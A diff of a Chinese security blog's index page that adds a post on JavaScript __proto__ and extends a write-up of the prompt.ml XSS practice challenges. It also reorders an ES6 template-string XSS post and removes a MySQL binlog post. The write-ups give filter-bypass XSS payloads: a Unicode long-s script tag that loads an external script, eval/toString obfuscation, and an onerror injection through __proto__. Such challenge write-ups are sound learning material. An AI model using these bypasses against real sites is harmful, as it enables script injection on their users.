@@ -80,6 +80,57 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/08/13/2016/js-proto/" title="Object__proto__" itemprop="url">Object__proto__</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-08-12T16:00:00.000Z" itemprop="datePublished"> 发表于 08-13-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>还是从做xss题目中学到的使用姿势, 概念还是很简单的</p>
+<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p><br><br><br><br><br>代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="string">"source"</span> : <span class="string">"I am defined."</span>,</span><br><span class="line">  <span class="string">"__proto__"</span> : &#123;</span><br><span class="line">    <span class="string">"source"</span> : <span class="string">"I have been redefined!"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">a.source; <span class="comment">//I am defined.</span></span><br><span class="line"><span class="keyword">delete</span> a.source;</span><br><span class="line">a.source; <span class="comment">//I have been redefined!</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>原型规则</code>, 优先查找自己属性, 然后找爸爸.</p>
+<h3 id="xss应用"><a href="#xss应用" class="headerlink" title="xss应用"></a>xss应用</h3><p>环境比较叼钻了, 匹配规则导致原有的属性被删掉, 但是可以利用<code>__proto</code>来进行一个重定义来达到目的<br>可以访问这个来测试一下:<a href="http://prompt.ml/13" target="_blank" rel="external">prompt-13</a></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="external">MDN-__proto__</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/08/13/2016/js-proto/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/13/2016/js-proto/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/08/07/2016/xss-4/" title="xss习题集_2.2" itemprop="url">xss习题集_2.2</a>
   </h1>
   <p class="article-author">By
@@ -94,10 +145,10 @@
     <div class="article-content">
         
         <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>还是这个站<a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a>, 不过是下集, 没想到自己不会这么多, 才会出的下集2333</p>
-<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-9"><a href="#Level-9" class="headerlink" title="Level-9"></a>Level-9</h3><blockquote>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-9-unicode绕过"><a href="#Level-9-unicode绕过" class="headerlink" title="Level-9 unicode绕过"></a>Level-9 unicode绕过</h3><blockquote>
 <p>input.replace(/&lt;([a-zA-Z])/g, ‘<_$1'); input="input.toUpperCase();" return="" '<h1="">‘ + input + ‘‘;</_$1');></p>
 </blockquote>
-<p>主要是过滤了所有感觉能用的字符, 答案还是比较厉害..<br>js函数大写也有被过滤, 不过可以编码和外部加载解决.注意, 在linux/unix下文件名区分大小写, 可以申请全大写或者一些奇怪的字符来进行绕过<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg&gt;<span class="xml"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">href</span>=<span class="string">//ᄒ.ws/XXXX</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>主要是过滤了所有感觉能用的字符, 答案还是比较厉害..<br>js函数大写也有被过滤, 不过可以编码和外部加载解决.注意, 在linux/unix下文件名区分大小写, 可以申请全大写或者一些奇怪的字符来进行绕过<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg&gt;&lt;ſcript href=//ᄒ.ws/XXXX&gt;&lt;/ſcript&gt;</span><br></pre></td></tr></table></figure></p>
 <p>自己写的变形:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg onload=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&gt;</span><br></pre></td></tr></table></figure></p>
 <h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>目前我能找到的几个latin letter, 更多的需要探索 -&gt; <a href="http://graphemica.com/unicode/characters" target="_blank" rel="external">unicode-characters</a></p>
 <blockquote>
@@ -133,8 +184,18 @@
 <p>不过答案还用了<code>toString()</code>,比较灵活~<br>vector2:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	(<span class="number">1558153217</span>).toString(<span class="number">36</span>)  <span class="comment">//数字可以通过 parseInt('prompt', 36) 获得</span></span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
 <p>也是给我了一个提醒, 想起来以前密码学学的一个toString()和parseInt()的进制转化了.<br>嗯, github还有个改进版本<br>vector3:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
 <p>eval这个函数感觉像是没来过一样.完全不影响后续输出</p>
-<h3 id="Level-13"><a href="#Level-13" class="headerlink" title="Level-13"></a>Level-13</h3><p>&gt;</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
+<p>vector4(变种):<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">1558153217.</span>.toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>关于<code>.</code>的多义性直接戳<a href="https://gist.github.com/a1exlism/00dcfd26d2212e509d2cad28a6745574" target="_blank" rel="external">这个</a></p>
+<h3 id="Level-13-input为json对象-String-repalce-绕过"><a href="#Level-13-input为json对象-String-repalce-绕过" class="headerlink" title="Level-13 input为json对象,String.repalce()绕过"></a>Level-13 input为json对象,String.repalce()绕过</h3><p>代码表示的比较清楚..</p>
+<p>关键点</p>
+<ol>
+<li><a href="/08/13/2016/js-proto/">__proto__</a> 利用</li>
+<li>String.replace() <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#描述" target="_blank" rel="external">内置组<code>$\</code>, $`利用</a></li>
+</ol>
+<p>第二点的话再写个例子好了, 放在了<a href="https://gist.github.com/a1exlism/c6e507a7af27c68e644c520859934fbd" target="_blank" rel="external">gist</a>上.</p>
+<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">"source"</span> : <span class="string">"-"</span>,</span><br><span class="line"> <span class="string">"__proto__"</span> : &#123;<span class="string">"source"</span> : <span class="string">"$`onerror=alert(1)&gt;"</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Level-14-deprecated"><a href="#Level-14-deprecated" class="headerlink" title="Level-14-deprecated"></a>Level-14-deprecated</h3><p>原本思路是绕过img限制直接进行iframe的data协议xss, 但是uppercase已经无法绕过了..</p>
+<h3 id="Level-15"><a href="#Level-15" class="headerlink" title="Level-15"></a>Level-15</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
 
         
         
@@ -149,53 +210,6 @@
 	
 	  	<span></span>
 		<a href="/08/07/2016/xss-4/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/xss-4/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/08/07/2016/say-2/" title="无题" itemprop="url">无题</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-08-06T16:00:00.000Z" itemprop="datePublished"> 发表于 08-07-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><br><br><br>感觉一年下来感觉又是没什么成就, 有点烦.<br><br>有点事去看了一下域名, 发现work后缀的都变贵了233.可能这个域名对我来说算是最值钱的了哈哈<br><br>还有百度似乎并不收录work域名, 这个反而让我感觉很开心, 毕竟买的时候就考虑了这个问题, 嗯, 很好.<br><br>一到家就感觉有点适应不了, 总是贪玩, 怎么可以管不住自己呢. 自己好弱啊. 还有好多书要学啊, 还有一门语言也没碰呢.<br><br>第二件事情就是和协会老司机有点交流了, 谁让我一般不会去看qq的呢(其实就是不想用wine).<br></p>
-<h3 id="exit"><a href="#exit" class="headerlink" title="exit()"></a>exit()</h3>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/08/07/2016/say-2/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/say-2/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -285,35 +299,21 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/08/05/2016/js-template-strings/" title="ES6 模板字符串&amp;&amp;Xss利用" itemprop="url">ES6 模板字符串&amp;&amp;Xss利用</a>
+      <a href="/08/07/2016/say-2/" title="无题" itemprop="url">无题</a>
   </h1>
   <p class="article-author">By
        
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2016-08-04T16:00:00.000Z" itemprop="datePublished"> 发表于 08-05-2016</time>
+    <time datetime="2016-08-06T16:00:00.000Z" itemprop="datePublished"> 发表于 08-07-2016</time>
     
   </p>
 </header>
     <div class="article-content">
         
-        <h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>没事看了个xss, 借此学习一下这个template_strings</p>
-<h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`strings`</span> <span class="comment">//  单行 和' " 用法一样</span></span><br><span class="line"><span class="string">`string1</span><br><span class="line"> string2`</span> <span class="comment">//  多行</span></span><br><span class="line"><span class="string">`string <span class="subst">$&#123;expression&#125;</span> string`</span> <span class="comment">// 可以直接引用变量, 像angualr一样</span></span><br></pre></td></tr></table></figure>
-<h3 id="注意注释"><a href="#注意注释" class="headerlink" title="注意注释"></a>注意注释</h3><blockquote>
-<pre><code>console.log(` test1        // there is no comments can stand!
-     test2`);
-</code></pre></blockquote>
-<p>这句话看似有个单行注释, 实际上`会忽略注释的存在, 所以<code>注释无效</code></p>
-<h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  输出1</span></span><br></pre></td></tr></table></figure>
-<h3 id="特殊的-num"><a href="#特殊的-num" class="headerlink" title="特殊的//num"></a>特殊的//num</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;1234&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  可以直接输出1234</span></span><br></pre></td></tr></table></figure>
-<p>这个原因应该是 <code>数字开头</code>的不能作为js变量</p>
-<h2 id="xssVector"><a href="#xssVector" class="headerlink" title="xssVector"></a>xssVector</h2><h3 id="1st"><a href="#1st" class="headerlink" title="1st"></a>1st</h3><p>最简单的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`1`</span></span><br><span class="line"><span class="comment">//  直接绕过() "" ''</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2nd"><a href="#2nd" class="headerlink" title="2nd"></a>2nd</h3><p>第二个…<del>感觉是失败了</del><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert.call(<span class="keyword">this</span>, <span class="string">`<span class="subst">$&#123;1&#125;</span>`</span>)</span><br></pre></td></tr></table></figure></p>
-<h3 id="3rd"><a href="#3rd" class="headerlink" title="3rd"></a><strong>3rd</strong></h3><p>这个很棒, 绕过了() “” ‘’, 能使eval拥有<code>()</code>可以执行并且支持多种编码, 吊吊吊<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;`alert\x281)`&#125;</span>`</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="最后一个"><a href="#最后一个" class="headerlink" title="最后一个"></a>最后一个</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;`alert(1)`&#125;</span>`</span> === <span class="string">'alert(1)'</span> ? alert(<span class="literal">true</span>) : alert(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="external">MDN</a></p>
-
+        <h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><br><br><br>感觉一年下来感觉又是没什么成就, 有点烦.<br><br>有点事去看了一下域名, 发现work后缀的都变贵了233.可能这个域名对我来说算是最值钱的了哈哈<br><br>还有百度似乎并不收录work域名, 这个反而让我感觉很开心, 毕竟买的时候就考虑了这个问题, 嗯, 很好.<br><br>一到家就感觉有点适应不了, 总是贪玩, 怎么可以管不住自己呢. 自己好弱啊. 还有好多书要学啊, 还有一门语言也没碰呢.<br><br>第二件事情就是和协会老司机有点交流了, 谁让我一般不会去看qq的呢(其实就是不想用wine).<br></p>
+<h3 id="exit"><a href="#exit" class="headerlink" title="exit()"></a>exit()</h3>
         
         
         <p class="article-more-link">
@@ -326,7 +326,7 @@
 <div class="comments-count">
 	
 	  	<span></span>
-		<a href="/08/05/2016/js-template-strings/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/js-template-strings/" data-count-type="comments">&nbsp;</a>
+		<a href="/08/07/2016/say-2/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/say-2/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -463,6 +463,67 @@
 	
 	  	<span></span>
 		<a href="/08/05/2016/xss-3/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/xss-3/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/08/05/2016/js-template-strings/" title="ES6 模板字符串&amp;&amp;Xss利用" itemprop="url">ES6 模板字符串&amp;&amp;Xss利用</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-08-04T16:00:00.000Z" itemprop="datePublished"> 发表于 08-05-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>没事看了个xss, 借此学习一下这个template_strings</p>
+<h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`strings`</span> <span class="comment">//  单行 和' " 用法一样</span></span><br><span class="line"><span class="string">`string1</span><br><span class="line"> string2`</span> <span class="comment">//  多行</span></span><br><span class="line"><span class="string">`string <span class="subst">$&#123;expression&#125;</span> string`</span> <span class="comment">// 可以直接引用变量, 像angualr一样</span></span><br></pre></td></tr></table></figure>
+<h3 id="注意注释"><a href="#注意注释" class="headerlink" title="注意注释"></a>注意注释</h3><blockquote>
+<pre><code>console.log(` test1        // there is no comments can stand!
+     test2`);
+</code></pre></blockquote>
+<p>这句话看似有个单行注释, 实际上`会忽略注释的存在, 所以<code>注释无效</code></p>
+<h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  输出1</span></span><br></pre></td></tr></table></figure>
+<h3 id="特殊的-num"><a href="#特殊的-num" class="headerlink" title="特殊的//num"></a>特殊的//num</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;1234&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  可以直接输出1234</span></span><br></pre></td></tr></table></figure>
+<p>这个原因应该是 <code>数字开头</code>的不能作为js变量</p>
+<h2 id="xssVector"><a href="#xssVector" class="headerlink" title="xssVector"></a>xssVector</h2><h3 id="1st"><a href="#1st" class="headerlink" title="1st"></a>1st</h3><p>最简单的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`1`</span></span><br><span class="line"><span class="comment">//  直接绕过() "" ''</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2nd"><a href="#2nd" class="headerlink" title="2nd"></a>2nd</h3><p>第二个…<del>感觉是失败了</del><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert.call(<span class="keyword">this</span>, <span class="string">`<span class="subst">$&#123;1&#125;</span>`</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="3rd"><a href="#3rd" class="headerlink" title="3rd"></a><strong>3rd</strong></h3><p>这个很棒, 绕过了() “” ‘’, 能使eval拥有<code>()</code>可以执行并且支持多种编码, 吊吊吊<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;`alert\x281)`&#125;</span>`</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="最后一个"><a href="#最后一个" class="headerlink" title="最后一个"></a>最后一个</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;`alert(1)`&#125;</span>`</span> === <span class="string">'alert(1)'</span> ? alert(<span class="literal">true</span>) : alert(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="external">MDN</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/08/05/2016/js-template-strings/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/js-template-strings/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -803,60 +864,6 @@ linux:    192.168.55.128
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/07/02/2016/mysql-binlog/" title="mysql命令打错回退" itemprop="url">mysql命令打错回退</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-07-01T16:00:00.000Z" itemprop="datePublished"> 发表于 07-02-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习mysql过程中无意中写了两遍同样的语句, 然后就有这篇博客了<br>注意: 恢复的前提是已经开启bin_log了(所以我也晚了一步)</p>
-<h2 id="Version-Number"><a href="#Version-Number" class="headerlink" title="Version Number"></a>Version Number</h2><p>mysql  Ver 14.14 Distrib <code>5.7.12</code>, for Linux (x86_64) using  EditLine wrapper</p>
-<h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><h3 id="Configure-binlog"><a href="#Configure-binlog" class="headerlink" title="Configure binlog"></a>Configure binlog</h3><p>mysql的配置文件在<code>/etc/my.cnf</code><br><del>find / -type f -name “.cnf” | xargs grep “mysqld”能找到真实地址,后话</del><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 添加</span><br><span class="line">[mysqld]</span><br><span class="line">server_id=100 #为server配置一个id</span><br><span class="line">log-bin=/tmp/mysql-binlog #名字随便取</span><br></pre></td></tr></table></figure></p>
-<p>service mysql restart</p>
-<p>mysql&gt;show variables like ‘log_bin’中查看是否开启</p>
-<h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><p>通过时间戳来进行恢复<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlbinlog --stop-date=<span class="string">"2016-07-02 23:57:59"</span> /tmp/mysql-binlog.000001</span><br><span class="line">$ mysql -uroot -p</span><br></pre></td></tr></table></figure></p>
-<p>More:  man mysqlbinlog(不过有点多..)</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://blog.chinaunix.net/uid-25266990-id-199887.html" target="_blank" rel="external">Linux里如何查找文件内容-鸟哥</a><br><a href="http://www.dewen.net.cn/q/2654/%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9E%E6%B3%95%E5%8F%AF%E4%BB%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E6%92%A4%E9%94%80mysql%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1%E8%AF%AF%E6%93%8D%E4%BD%9C%EF%BC%9F" target="_blank" rel="external">有什么办法可以方便的撤销mysql中的一次误操作?-德问</a><br><a href="http://www.iteblog.com/mysql-binlog_basic_usage" target="_blank" rel="external">MySQL binlog基本用法</a><br><a href="http://blog.itpub.net/26506993/viewspace-2060130/" target="_blank" rel="external">haven’t provided the mandatory server-id-feelpurple</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/07/02/2016/mysql-binlog/#comments" class="ds-thread-count comments-count-link" data-thread-key="07/02/2016/mysql-binlog/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
@@ -881,7 +888,7 @@ linux:    192.168.55.128
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li 